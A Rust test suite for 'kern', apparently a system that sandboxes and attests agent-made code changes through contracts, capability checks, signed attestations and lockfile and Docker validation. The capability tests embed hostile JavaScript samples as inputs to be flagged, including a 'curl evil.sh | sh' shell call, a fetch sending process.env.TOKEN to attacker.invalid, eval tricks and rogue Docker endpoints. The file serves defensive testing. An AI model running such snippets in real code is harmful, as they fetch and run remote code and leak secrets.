use ed25519_dalek::SigningKey;
use kern::attest::{self, KeySource};
use kern::capability;
use kern::flow::{self, required_checks};
use kern::git::{self, Entry, Files};
use kern::policy::{self, Contract, Operator, attenuate, contract, contract_digest, operator, verifier_digest};
use kern::promote;
use kern::sandbox::{self, Spec};
use kern::util::*;
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-test-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
    fn join(&self, s: &str) -> PathBuf { self.0.join(s) }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}
fn sh(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn file(text: &str) -> Entry { Entry { mode: "100644".into(), bytes: text.as_bytes().to_vec() } }
fn files(items: &[(&str, &str)]) -> Files { items.iter().map(|(p, t)| (p.to_string(), file(t))).collect() }
fn policy_value() -> Value {
    json!({ "version": 2, "task": "fix-addition", "filesystem": { "read": ["README.md", "src/", "test/"], "write": ["src/", "test/"] }, "network": [], "secrets": [], "publish": false, "dependencies": null,
        "limits": { "files_changed": 8, "lines_changed": 200, "file_bytes": 65536, "total_bytes": 1048576, "timeout_seconds": 30, "memory_mb": 256, "pids": 64 }, "required_checks": ["addition"] })
}
fn operator_value(executors: &[&str]) -> Value {
    json!({ "version": 3, "repository": "acme/project", "deployment": "single-vm", "executors": executors, "image": format!("sha256:{}", "a".repeat(64)),
        "builders": { "executor": if executors.contains(&"kern-gvisor") { json!("d".repeat(64)) } else { Value::Null }, "verifier": "e".repeat(64) },
        "checks": [{ "id": "addition", "file": std::path::absolute("checks.json").unwrap(), "sha256": "b".repeat(64) }], "registry": "registry.npmjs.org", "permissions": { "test/": ["node:assert"] } })
}

struct Fixture { t: Temp, store: PathBuf, base: String, commit: String, original: Files, candidate: Files, policy: Contract, op: Operator, key: SigningKey, public: String, kern: Value, envelope: Value, run_id: String }
fn kern_payload(policy: &Contract, op: &Operator, run_id: &str, base: &str, commit: &str, manifest: &str, issued: u64) -> Value {
    json!({ "run_id": run_id, "task": policy.task, "repository": op.repository, "base": base, "commit": commit, "manifest_sha256": manifest, "contract_sha256": contract_digest(policy).unwrap(),
        "verifier_sha256": verifier_digest(op).unwrap(), "executor": { "kind": "external", "builder_sha256": null, "source_commit": commit }, "verifier_builder_sha256": op.verifier_builder,
        "deployment": "single-vm", "image": op.image, "runtime": "runsc", "dependencies_sha256": null,
        "checks": required_checks(policy).iter().map(|id| json!({ "id": id, "status": "PASS", "evidence_sha256": "c".repeat(64) })).collect::<Vec<_>>(), "issued_at": issued, "expires_at": issued + 60_000 })
}
fn fixture() -> Fixture {
    let t = Temp::new();
    let store = git::init_store(&t.join("objects.git")).unwrap();
    let original = files(&[("src/add.mjs", "export const add = (a, b) => a - b;\n"), ("README.md", "A fixture\n"), ("test/add.test.mjs", "import assert from 'node:assert';\nimport { add } from '../src/add.mjs';\nassert.equal(add(1, 2), 3);\n")]);
    let base = git::write_commit(&store, &original, None, "fixture").unwrap();
    let mut candidate = original.clone();
    candidate.insert("src/add.mjs".into(), file("export const add = (a, b) => a + b;\n"));
    let policy = contract(&policy_value()).unwrap();
    let op = operator(&operator_value(&["external"])).unwrap();
    let commit = git::write_commit(&store, &candidate, Some(&base), &policy.task).unwrap();
    let manifest = digest(&git::manifest(&store, &commit, 65536, 1048576).unwrap()).unwrap();
    let key = SigningKey::from_bytes(&random_bytes::<32>().unwrap());
    let public = attest::public_pem(&key.verifying_key()).unwrap();
    let run_id = uuid4().unwrap();
    let kern = kern_payload(&policy, &op, &run_id, &base, &commit, &manifest, now_ms() - 1000);
    let envelope = attest::sign(&kern, &KeySource::File(key.clone())).unwrap();
    Fixture { t, store, base, commit, original, candidate, policy, op, key, public, kern, envelope, run_id }
}
fn expected(f: &Fixture) -> Value { json!({ "run_id": f.run_id, "base": f.base, "commit": f.commit, "branch": format!("kern/{}/{}", f.policy.task, f.run_id) }) }
fn denied<T>(r: R<T>, needle: &str) {
    match r { Ok(_) => panic!("expected denial containing {needle:?}"), Err(e) => assert!(e.0.contains(needle), "{:?} does not contain {needle:?}", e.0) }
}

#[test]
fn commits_are_byte_identical_to_git_and_reads_are_exact() {
    let t = Temp::new();
    let repo = t.join("repo");
    std::fs::create_dir_all(repo.join("src/deep/er")).unwrap();
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in [("README.md", "hi\n"), ("src/a.js", "a\n"), ("src/deep/er/b.ts", "b\n"), ("src/a-b.js", "x\n"), ("src/a.b.js", "y\n"), ("logo@2x.png", "\u{1}\u{2}"), ("docs/Über uns.md", "ü\n")] {
        std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap();
        std::fs::write(repo.join(p), c).unwrap();
    }
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let head = sh(&repo, &["rev-parse", "HEAD"]);
    let read = git::read_commit(&repo, &head, 1048576, 16777216).unwrap();
    assert_eq!(read.len(), 7);
    assert_eq!(read["docs/Über uns.md"].bytes, "ü\n".as_bytes());
    let mine = git::write_commit(&repo, &read, None, "oracle").unwrap();
    assert_eq!(sh(&repo, &["rev-parse", &format!("{mine}^{{tree}}")]), sh(&repo, &["rev-parse", "HEAD^{tree}"]));
    assert_eq!(git::write_commit(&repo, &read, None, "oracle").unwrap(), mine);
    denied(git::read_commit(&repo, &head, 1048576, 10), "byte limits");
}
#[test]
fn symlinks_submodules_case_collisions_and_reserved_names_are_refused() {
    let t = Temp::new();
    let store = git::init_store(&t.join("s.git")).unwrap();
    for (names, needle) in [(vec!["src/X.js", "src/x.js"], "Case-colliding"), (vec!["a", "a/b"], "collision"), (vec![".git/config"], "Reserved"), (vec!["src/CON.txt"], "Nonportable"), (vec!["a:b"], "Nonportable"), (vec!["a\\b"], "Nonportable")] {
        let fs: Files = names.iter().map(|n| (n.to_string(), file("x"))).collect();
        denied(git::write_commit(&store, &fs, None, "t"), needle);
    }
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::write(repo.join("a"), "a").unwrap();
    sh(&repo, &["add", "a"]);
    let blob = sh(&repo, &["hash-object", "-w", "a"]);
    sh(&repo, &["update-index", "--add", "--cacheinfo", &format!("120000,{blob},link")]);
    sh(&repo, &["commit", "-qm", "link"]);
    denied(git::read_commit(&repo, &sh(&repo, &["rev-parse", "HEAD"]), 1048576, 16777216), "Symlinks");
}
#[test]
fn shallow_import_and_bundle_handoff_round_trip_and_reject_tampering() {
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::create_dir_all(repo.join("src")).unwrap();
    for (i, text) in ["one\n", "two\n"].iter().enumerate() {
        std::fs::write(repo.join("src/a.js"), text).unwrap();
        sh(&repo, &["add", "-A"]);
        sh(&repo, &["commit", "-qm", &format!("c{i}")]);
    }
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    let store = git::import_base(&repo, &base, &t.join("exec.git")).unwrap();
    let mut fs = git::read_commit(&store, &base, 1048576, 16777216).unwrap();
    fs.insert("src/a.js".into(), file("three\n"));
    let commit = git::write_commit(&store, &fs, Some(&base), "t").unwrap();
    let run = json!({ "version": 2, "run_id": uuid4().unwrap(), "repository": "acme/project", "base": base, "commit": commit, "contract_sha256": "a".repeat(64),
        "manifest_sha256": digest(&git::manifest(&store, &commit, 1048576, 16777216).unwrap()).unwrap(), "executor": { "kind": "external", "source_commit": commit }, "dependencies": null });
    git::handoff(&store, &run, &t.join("handoff")).unwrap();
    let verifier = git::init_store(&t.join("independent.git")).unwrap();
    sh(&verifier, &["bundle", "verify", t.join("handoff/artifact.bundle").to_str().unwrap()]);
    let imported = git::import_handoff(&t.join("handoff"), &t.join("verifier")).unwrap();
    assert_eq!(imported["status"], "IMPORTED_UNVERIFIED");
    let mut bad = run.clone();
    bad["manifest_sha256"] = json!("b".repeat(64));
    std::fs::create_dir(t.join("tampered")).unwrap();
    std::fs::copy(t.join("handoff/artifact.bundle"), t.join("tampered/artifact.bundle")).unwrap();
    write_json(t.join("tampered/run.json"), &bad).unwrap();
    denied(git::import_handoff(&t.join("tampered"), &t.join("v2")), "manifest mismatch");
    std::fs::create_dir(t.join("corrupt")).unwrap();
    let mut bytes = std::fs::read(t.join("handoff/artifact.bundle")).unwrap();
    let n = bytes.len();
    bytes[n - 30] ^= 0xff;
    std::fs::write(t.join("corrupt/artifact.bundle"), bytes).unwrap();
    std::fs::copy(t.join("handoff/run.json"), t.join("corrupt/run.json")).unwrap();
    assert!(git::import_handoff(&t.join("corrupt"), &t.join("v3")).is_err());
    let mut swapped = run.clone();
    swapped["base"] = json!(commit);
    swapped["commit"] = json!(base);
    std::fs::create_dir(t.join("swapped")).unwrap();
    std::fs::copy(t.join("handoff/artifact.bundle"), t.join("swapped/artifact.bundle")).unwrap();
    write_json(t.join("swapped/run.json"), &swapped).unwrap();
    denied(git::import_handoff(&t.join("swapped"), &t.join("v4")), "exactly the run base and candidate");
}
#[test]
fn change_gate_enforces_grants_protected_paths_budgets_and_text() {
    let f = fixture();
    assert_eq!(git::changes(&f.original, &f.candidate, &f.policy).unwrap()["lines_upper_bound"], 2);
    for (name, needle) in [("README.md", "outside contract"), ("src/package.json", "Protected"), ("src/.npmrc", "Protected"), ("src/.github/workflows/a.yml", "Protected"), ("src/.env.local", "Protected"), ("src/node_modules/x.js", "Protected")] {
        let mut c = f.candidate.clone();
        c.insert(name.into(), file("x"));
        denied(git::changes(&f.original, &c, &f.policy), needle);
    }
    let mut c = f.candidate.clone();
    c.insert("src/bin.dat".into(), Entry { mode: "100644".into(), bytes: vec![0, 1] });
    denied(git::changes(&f.original, &c, &f.policy), "Binary");
    let mut tight = policy_value();
    tight["limits"]["lines_changed"] = json!(1);
    denied(git::changes(&f.original, &f.candidate, &contract(&tight).unwrap()), "budget");
}
#[test]
fn contracts_parse_strictly_and_only_attenuate() {
    let p = policy_value();
    contract(&p).unwrap();
    for (mutate, needle) in [
        (Box::new(|v: &mut Value| v["network"] = json!(["0.0.0.0/0"])) as Box<dyn Fn(&mut Value)>, "no network"), (Box::new(|v: &mut Value| v["secrets"] = json!(["AWS"])), "no secrets"),
        (Box::new(|v: &mut Value| v["publish"] = json!(true)), "publication"), (Box::new(|v: &mut Value| v["extra"] = json!(1)), "unknown"),
        (Box::new(|v: &mut Value| v["filesystem"]["write"] = json!(["lib/"])), "requires read"), (Box::new(|v: &mut Value| v["filesystem"]["read"] = json!(["../etc", "src/", "test/"])), "Nonportable"),
        (Box::new(|v: &mut Value| v["filesystem"]["read"] = json!(["node_modules/", "src/", "test/"])), "not grantable"), (Box::new(|v: &mut Value| v["limits"]["memory_mb"] = json!(999999)), "memory_mb"),
        (Box::new(|v: &mut Value| v["dependencies"] = json!({ "manager": "pip", "lockfile": "x" })), "npm"),
    ] {
        let mut v = p.clone();
        mutate(&mut v);
        denied(contract(&v), needle);
    }
    let mut wider = p.clone();
    wider["filesystem"]["write"] = json!(["src/", "test/", "README.md/"]);
    assert!(attenuate(&p, &wider).is_err());
    let mut fewer = p.clone();
    fewer["required_checks"] = json!(["other"]);
    denied(attenuate(&p, &fewer), "remove a required check");
    let mut deps = p.clone();
    deps["dependencies"] = json!({ "manager": "npm", "lockfile": "package-lock.json" });
    denied(attenuate(&p, &deps), "dependency");
    let mut narrower = p.clone();
    narrower["filesystem"]["write"] = json!(["src/"]);
    narrower["limits"]["timeout_seconds"] = json!(10);
    assert_eq!(attenuate(&p, &narrower).unwrap().write, vec!["src/".to_string()]);
}
#[test]
fn operators_bind_deployment_executors_and_builders() {
    operator(&operator_value(&["external"])).unwrap();
    operator(&operator_value(&["external", "kern-gvisor"])).unwrap();
    let mut v = operator_value(&["kern-gvisor"]);
    v["builders"]["executor"] = Value::Null;
    denied(operator(&v), "executor builder");
    let mut v = operator_value(&["external"]);
    v["deployment"] = json!("laptop");
    denied(operator(&v), "single-vm or multi-machine");
    let mut v = operator_value(&["external"]);
    v["permissions"] = json!({ "src/": ["root:everything"] });
    denied(operator(&v), "Invalid capability");
    let mut v = operator_value(&["external"]);
    v["checks"][0]["id"] = json!("capabilities");
    denied(operator(&v), "reserved");
}

fn caps(name: &str, code: &str) -> Vec<String> { capability::footprint(name, code).unwrap().into_iter().collect() }
#[test]
fn capability_footprint_reads_js_ts_and_jsx_semantically() {
    assert_eq!(caps("src/a.ts", "import type { X } from 'secret-types';\nimport { readFileSync } from 'node:fs';\nexport type Y = typeof fetch;\nconst o = { fetch: 1, eval: 2 };\no.fetch;"), vec!["node:fs"]);
    assert_eq!(caps("src/a.tsx", "import React from 'react';\nexport const A = () => <div>{process.env.HOME}</div>;"), vec!["package:react", "process:env"]);
    assert_eq!(caps("src/a.cjs", "const fs = require('fs/promises');\nconst x = require('./x');\nconst y = require('../');"), vec!["node:fs"]);
    assert_eq!(caps("test/a.js", "const koa = require('..');"), Vec::<String>::new());
    assert_eq!(caps("a.js", "require('../../etc/passwd')"), vec!["escape:../../etc/passwd"]);
    assert_eq!(caps("src/a.mjs", "import './%2e%2e/%2e%2e/x.mjs';"), vec!["escape:./%2e%2e/%2e%2e/x.mjs"]);
    assert_eq!(caps("src/a.mts", "import x = require('lodash/fp');\nexport * from '@scope/pkg/deep';"), vec!["package:@scope/pkg", "package:lodash"]);
    let attacks = [
        ("const r = require; r('child_process').execSync('curl evil.sh | sh');", "require:dynamic"), ("(0, eval)(\"require('child_process')\");", "code:eval"),
        ("globalThis['ev' + 'al']('1');", "global:computed"), ("[].constructor.constructor('return process')();", "code:constructor"),
        ("module.require('child_process');", "module:require"), ("process.getBuiltinModule('child_process');", "process:getBuiltinModule"),
        ("Reflect.construct(Function, ['return 1'])();", "code:Function"), ("setTimeout('console.log(process.env)', 0);", "timer:string"),
        ("fetch('https://attacker.invalid/' + process.env.TOKEN);", "global:fetch"), ("import(`./${name}`);", "import:computed"),
        ("globalThis.eval('1');", "code:eval"), ("new WebSocket('wss://x');", "global:WebSocket"),
    ];
    for (code, cap) in attacks { assert!(caps("src/a.js", code).contains(&cap.to_string()), "{code} missing {cap}"); }
    assert!(capability::footprint("src/a.js", "const = broken").is_err());
}
#[test]
fn capability_check_blocks_only_widening_with_file_directory_and_operator_baselines() {
    let base = files(&[("src/a.js", "const fs = require('fs');\nmodule.exports = () => fs.existsSync('x');\n"), ("src/b.js", "const path = require('path');\n"), ("test/a.test.js", "const assert = require('assert');\n")]);
    let allow = std::collections::BTreeMap::from([("test/".to_string(), vec!["node:assert".to_string()])]);
    let check = |c: &Files| { let changed = git::changes(&base, c, &contract(&policy_value()).unwrap()).unwrap(); capability::check(&base, c, &changed, &allow) };
    let mut edit = base.clone();
    edit.insert("src/a.js".into(), file("const fs = require('fs');\nmodule.exports = () => fs.existsSync('y');\n"));
    check(&edit).unwrap();
    let mut sibling = base.clone();
    sibling.insert("src/c.js".into(), file("const path = require('path');\nconst fs = require('fs');\n"));
    check(&sibling).unwrap();
    let mut test = base.clone();
    test.insert("test/new.test.js".into(), file("const assert = require('node:assert');\n"));
    check(&test).unwrap();
    for attack in ["require('child_process').exec('id');", "fetch('https://attacker.invalid');", "const r = require; r('net');", "process.env.SECRET;"] {
        let mut c = base.clone();
        c.insert("src/a.js".into(), file(&format!("const fs = require('fs');\n{attack}\n")));
        denied(check(&c), "widens module capabilities");
    }
    let mut ts = base.clone();
    ts.insert("src/types.ts".into(), file("export const x: number = 1;\n"));
    check(&ts).unwrap();
    let mut shell = base.clone();
    shell.insert("src/run.sh".into(), file("curl x\n"));
    denied(check(&shell), "Unsupported changed file type");
}

#[test]
fn attestation_is_canonical_in_toto_vsa_bound_to_exact_expectations() {
    let f = fixture();
    let stmt: Value = serde_json::from_slice(&unb64(f.envelope["payload"].as_str().unwrap()).unwrap()).unwrap();
    assert_eq!(f.envelope["payloadType"], "application/vnd.in-toto+json");
    assert_eq!(stmt["_type"], "https://in-toto.io/Statement/v1");
    assert_eq!(stmt["predicateType"], "https://slsa.dev/verification_summary/v1");
    assert_eq!(stmt["subject"][0]["digest"]["gitCommit"], f.commit);
    assert_eq!(stmt["predicate"]["verificationResult"], "PASSED");
    assert!(stmt["predicate"]["verifiedLevels"][0].as_str().unwrap().starts_with("KERN_"));
    let d = promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &expected(&f), now_ms()).unwrap();
    assert_eq!(d.commit, f.commit);
    for field in ["run_id", "task", "repository", "base", "commit", "manifest_sha256", "contract_sha256", "verifier_sha256", "verifier_builder_sha256", "deployment", "image", "runtime"] {
        let mut k = f.kern.clone();
        k[field] = json!("wrong");
        let env = attest::sign(&k, &KeySource::File(f.key.clone())).unwrap();
        assert!(promote::authorize(&f.store, &env, &f.public, &f.policy, &f.op, &expected(&f), now_ms()).is_err(), "{field}");
    }
    for (mutate, needle) in [
        (Box::new(|k: &mut Value| { k["checks"].as_array_mut().unwrap().pop(); }) as Box<dyn Fn(&mut Value)>, "check set"), (Box::new(|k: &mut Value| k["checks"][0]["status"] = json!("FAIL")), "failed"),
        (Box::new(|k: &mut Value| k["expires_at"] = k["issued_at"].clone()), "time window"), (Box::new(|k: &mut Value| k["issued_at"] = json!(now_ms() + 100000)), "time window"),
        (Box::new(|k: &mut Value| k["executor"]["kind"] = json!("kern-gvisor")), "not accepted"), (Box::new(|k: &mut Value| k["override"] = json!(true)), "unknown fields"),
    ] {
        let mut k = f.kern.clone();
        mutate(&mut k);
        let env = attest::sign(&k, &KeySource::File(f.key.clone())).unwrap();
        denied(promote::authorize(&f.store, &env, &f.public, &f.policy, &f.op, &expected(&f), now_ms()), needle);
    }
    let mut stmt2 = stmt.clone();
    stmt2["predicate"]["verificationResult"] = json!("FAILED");
    let bytes = canonical(&stmt2).unwrap().into_bytes();
    let sig = ed25519_dalek::Signer::sign(&f.key, &attest::pae(attest::PAYLOAD_TYPE, &bytes));
    let forged = json!({ "payloadType": attest::PAYLOAD_TYPE, "payload": b64(&bytes), "signatures": [{ "keyid": f.envelope["signatures"][0]["keyid"], "sig": b64(&sig.to_bytes()) }] });
    denied(promote::authorize(&f.store, &forged, &f.public, &f.policy, &f.op, &expected(&f), now_ms()), "canonical");
    let other = attest::public_pem(&SigningKey::from_bytes(&random_bytes::<32>().unwrap()).verifying_key()).unwrap();
    denied(promote::authorize(&f.store, &f.envelope, &other, &f.policy, &f.op, &expected(&f), now_ms()), "Untrusted");
    let mut tampered = f.envelope.clone();
    tampered["payload"] = json!(b64(b"{}"));
    denied(promote::authorize(&f.store, &tampered, &f.public, &f.policy, &f.op, &expected(&f), now_ms()), "signature");
    denied(promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &expected(&f), now_ms() + 3_600_000), "expired");
    let mut main = expected(&f);
    main["branch"] = json!("main");
    denied(promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &main, now_ms()), "run-specific");
}
#[test]
fn promotion_is_create_only_and_consumed_exactly_once() {
    let f = fixture();
    let d = promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &expected(&f), now_ms()).unwrap();
    let target = git::init_store(&f.t.join("target.git")).unwrap();
    git::write_commit(&target, &f.original, None, "fixture").unwrap();
    promote::promote_local(&f.store, &d, &f.public, &target, None).unwrap();
    assert_eq!(git::trimmed(git::git(&target, &["rev-parse", &format!("refs/heads/{}", d.branch)], None).unwrap()), f.commit);
    git::git(&target, &["update-ref", "-d", &format!("refs/heads/{}", d.branch)], None).unwrap();
    denied(promote::promote_local(&f.store, &d, &f.public, &target, None), "already consumed");
    let ledger = f.t.join("ledger");
    let handles: Vec<_> = (0..8).map(|_| { let (l, dd, k) = (ledger.clone(), promote::Decision { repository: d.repository.clone(), branch: d.branch.clone(), base: d.base.clone(), commit: d.commit.clone(), run_id: d.run_id.clone(), attestation: Value::Null }, f.public.clone()); std::thread::spawn(move || promote::consume(&l, &dd, &k).is_ok()) }).collect();
    assert_eq!(handles.into_iter().map(|h| h.join().unwrap()).filter(|ok| *ok).count(), 1);
}
#[test]
fn github_required_check_reverifies_the_exact_pr_head() {
    let f = fixture();
    let repo = f.t.join("gh");
    sh(&f.t.0, &["init", "-q", "gh"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in &f.original { std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap(); std::fs::write(repo.join(p), &c.bytes).unwrap(); }
    std::fs::create_dir_all(repo.join(".github/kern/tasks")).unwrap();
    let mut op = operator_value(&["external"]);
    op["checks"][0]["file"] = json!(std::path::absolute("checks.json").unwrap());
    std::fs::write(repo.join(".github/kern/operator.json"), op.to_string()).unwrap();
    std::fs::write(repo.join(".github/kern/verifier.pub"), &f.public).unwrap();
    std::fs::write(repo.join(".github/kern/tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    let mut candidate = git::read_commit(&repo, &base, 1048576, 16777216).unwrap();
    candidate.insert("src/add.mjs".into(), file("export const add = (a, b) => a + b;\n"));
    let head = git::write_commit(&repo, &candidate, Some(&base), "fix-addition").unwrap();
    let policy = contract(&policy_value()).unwrap();
    let opr = operator(&op).unwrap();
    let manifest = digest(&git::manifest(&repo, &head, 65536, 1048576).unwrap()).unwrap();
    let run_id = uuid4().unwrap();
    let envelope = attest::sign(&kern_payload(&policy, &opr, &run_id, &base, &head, &manifest, now_ms() - 7_200_000), &KeySource::File(f.key.clone())).unwrap();
    let d = promote::Decision { repository: "acme/project".into(), branch: format!("kern/fix-addition/{run_id}"), base: base.clone(), commit: head.clone(), run_id: run_id.clone(), attestation: Value::Null };
    let event = |head_sha: &str, base_sha: &str, branch: &str, body: &str| json!({ "pull_request": { "head": { "sha": head_sha, "ref": branch }, "base": { "sha": base_sha, "repo": { "full_name": "acme/project" } }, "body": body } });
    let body = promote::pr_body("fix-addition", &d, &envelope).unwrap();
    let pass = promote::check_pr(&event(&head, &base, &d.branch, &body), &repo, ".github/kern", now_ms()).unwrap();
    assert_eq!(pass["status"], "PASS");
    assert_eq!(promote::check_pr(&event(&head, &base, "feature/human", ""), &repo, ".github/kern", now_ms()).unwrap()["status"], "SKIPPED");
    denied(promote::check_pr(&event(&head, &base, &d.branch, "no attestation"), &repo, ".github/kern", now_ms()), "exactly one");
    denied(promote::check_pr(&event(&base, &base, &d.branch, &body), &repo, ".github/kern", now_ms()), "Attestation mismatch");
    let mut moved = candidate.clone();
    moved.insert("src/extra.mjs".into(), file("export const z = 1;\n"));
    let new_head = git::write_commit(&repo, &moved, Some(&base), "x").unwrap();
    denied(promote::check_pr(&event(&new_head, &base, &d.branch, &body), &repo, ".github/kern", now_ms()), "Attestation mismatch");
    let next_base = git::write_commit(&repo, &f.original, Some(&base), "moved").unwrap();
    denied(promote::check_pr(&event(&head, &next_base, &d.branch, &body), &repo, ".github/kern", now_ms()), "");
    let wrong_key = attest::sign(&kern_payload(&policy, &opr, &run_id, &base, &head, &manifest, now_ms() - 1000), &KeySource::File(SigningKey::from_bytes(&random_bytes::<32>().unwrap()))).unwrap();
    denied(promote::check_pr(&event(&head, &base, &d.branch, &promote::pr_body("fix-addition", &d, &wrong_key).unwrap()), &repo, ".github/kern", now_ms()), "Untrusted");
}
#[test]
fn ingest_accepts_external_agent_commits_only_within_the_contract() {
    let t = Temp::new();
    let source = t.join("source");
    sh(&t.0, &["init", "-q", "source"]);
    sh(&source, &["config", "core.autocrlf", "false"]);
    std::fs::create_dir_all(source.join("src")).unwrap();
    std::fs::write(source.join("src/add.mjs"), "export const add = (a, b) => a - b;\n").unwrap();
    std::fs::write(source.join("README.md"), "x\n").unwrap();
    sh(&source, &["add", "-A"]);
    sh(&source, &["commit", "-qm", "base"]);
    let base = sh(&source, &["rev-parse", "HEAD"]);
    sh(&t.0, &["clone", "-q", "source", "agent"]);
    let agent = t.join("agent");
    sh(&agent, &["config", "core.autocrlf", "false"]);
    std::fs::write(agent.join("src/add.mjs"), "export const add = (a, b) => a + b;\n").unwrap();
    sh(&agent, &["commit", "-qam", "agent fix"]);
    let good = sh(&agent, &["rev-parse", "HEAD"]);
    std::fs::write(agent.join("README.md"), "agent rewrote docs\n").unwrap();
    sh(&agent, &["commit", "-qam", "agent overreach"]);
    let bad = sh(&agent, &["rev-parse", "HEAD"]);
    std::fs::write(t.join("contract.json"), policy_value().to_string()).unwrap();
    std::fs::write(t.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::create_dir(t.join("keys")).unwrap();
    std::fs::write(t.join("keys/public.pem"), attest::keypair().unwrap().1).unwrap();
    std::fs::write(t.join("job.json"), json!({ "version": 3, "repo": "source", "base": base, "contract": "contract.json", "operator": "operator.json", "command": null, "verification_key": "keys/public.pem", "output": "tasks" }).to_string()).unwrap();
    let mut inside = policy::job(&t.join("job.json")).unwrap();
    inside.output = t.join("keys/tasks");
    assert_eq!(flow::task(&inside, flow::Source::Ingest(&agent, &good)).unwrap()["status"], "BLOCKED");
    assert!(!t.join("keys/tasks").exists());
    let job = policy::job(&t.join("job.json")).unwrap();
    let r = flow::task(&job, flow::Source::Ingest(&agent, &good)).unwrap();
    assert_eq!(r["status"], "CANDIDATE", "{r}");
    assert_eq!(r["executor"], "external");
    let bundle = PathBuf::from(r["bundle"].as_str().unwrap());
    assert!(std::fs::read_to_string(bundle.join("changes.patch")).unwrap().contains("+export const add = (a, b) => a + b;"));
    let imported = git::import_handoff(&bundle.join("handoff"), &t.join("verifier-run")).unwrap();
    assert_eq!(imported["commit"], r["commit"]);
    let blocked = flow::task(&job, flow::Source::Ingest(&agent, &bad)).unwrap();
    assert_eq!(blocked["status"], "BLOCKED");
    assert!(blocked["reason"].as_str().unwrap().contains("outside contract"));
}
#[test]
fn lockfiles_must_pin_every_package_to_the_registry_with_integrity() {
    let lock = |pkgs: Value| -> Files { [("package.json".to_string(), file("{}")), ("package-lock.json".to_string(), file(&json!({ "lockfileVersion": 3, "packages": pkgs }).to_string()))].into_iter().collect() };
    let ok = json!({ "": {}, "node_modules/a": { "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz", "integrity": "sha512-x" }, "node_modules/a/node_modules/b": { "inBundle": true } });
    assert_eq!(flow::validate_lockfile(&lock(ok), "registry.npmjs.org").unwrap()["sha1_only"], 0);
    let legacy = flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org/a.tgz", "integrity": "sha1-abc" } })), "registry.npmjs.org").unwrap();
    assert_eq!((legacy["packages"].as_u64(), legacy["sha1_only"].as_u64()), (Some(1), Some(1)));
    flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "http://registry.npmjs.org/a.tgz", "integrity": "sha512-x" } })), "registry.npmjs.org").unwrap();
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://evil.invalid/a.tgz", "integrity": "sha512-x" } })), "registry.npmjs.org"), "does not resolve");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org.evil.invalid/a.tgz", "integrity": "sha512-x" } })), "registry.npmjs.org"), "does not resolve");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org/a.tgz", "integrity": "md5-x" } })), "registry.npmjs.org"), "standard integrity");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "link": true } })), "registry.npmjs.org"), "Linked");
    denied(flow::validate_lockfile(&lock(json!({ "node_modules/a": { "resolved": "https://registry.npmjs.org/a.tgz" } })), "registry.npmjs.org"), "standard integrity");
    denied(flow::validate_lockfile(&files(&[("package.json", "{}")]), "registry.npmjs.org"), "package-lock.json");
}
#[test]
fn docker_and_container_configuration_cannot_be_widened() {
    let t = Temp::new();
    let tool = t.join("tool");
    std::fs::write(&tool, "pinned-tool-fixture").unwrap();
    let p = json!({ "file": tool, "sha256": sha256(std::fs::read(&tool).unwrap()) });
    let control = json!({ "version": 1, "role": "executor", "docker": { "file": p["file"], "sha256": p["sha256"], "endpoint": policy::ENDPOINT }, "git": p, "host_policy": p,
        "runtime": { "file": "/usr/local/bin/runsc", "sha256": "a".repeat(64), "version": "fixture", "arguments": [] } });
    let c = policy::validate_control(&control).unwrap();
    let (_, args, env) = sandbox::docker_invocation(&c, &["info"], Path::new("/fresh")).unwrap();
    assert_eq!(args[..4], ["--config", "/fresh", "--host", policy::ENDPOINT]);
    assert!(env.iter().any(|(k, v)| k == "PATH" && v.is_empty()) && !env.iter().any(|(k, _)| k == "DOCKER_HOST" || k == "HTTP_PROXY"));
    for flag in ["--host=tcp://evil", "--context=x", "-Htcp://evil", "--config", "--tls"] { denied(sandbox::docker_invocation(&c, &["info", flag], Path::new("/x")), "overrides"); }
    let mut remote = control.clone();
    remote["docker"]["endpoint"] = json!("tcp://attacker:2375");
    denied(policy::validate_control(&remote), "fixed local Docker socket");
    let mut args_runtime = control.clone();
    args_runtime["runtime"]["arguments"] = json!(["--platform=ptrace"]);
    denied(policy::validate_control(&args_runtime), "default runsc arguments");
    std::fs::write(&tool, "changed").unwrap();
